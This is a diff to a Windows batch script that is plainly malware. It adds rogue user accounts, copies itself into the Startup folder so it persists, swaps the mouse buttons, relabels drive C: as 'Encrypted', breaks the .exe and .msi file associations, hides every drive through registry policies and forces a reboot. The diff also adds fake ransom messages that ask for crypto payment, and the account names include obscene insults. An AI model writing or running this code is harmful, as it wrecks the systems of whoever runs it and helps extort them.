@@ -1,8 +1,9 @@
 @echo off
 :a
 color 02
-echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
-Start cmd
+echo It software is virus please
+echo pay to my crtpto wallet
+echo 1sd2k4ns_rf4d2s35fty
 net user %random% DEATH /add
 net user "Гандон" DEATH /add
 net user FuckYou DEATH /add
@@ -12,18 +13,14 @@ md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
-Start notepad
-shutdown /r /t 25 /c "PC FUCKING"​
-start explorer
-start mspaint
-start mmc
+shutdown /r /t 200 /c "it software virus"​
 copy %0 "C:\Users\Public\Desktop"
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-label C:Fucked​
+label C:Encrypted
 rundll32 user32, SwapMouseButton
-assoc .exe=bat
-assoc .msi=bat
-assoc .exe=bat
+assoc .exe=.txt
+assoc .msi=.txt
+assoc .exe=.txt
 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f 
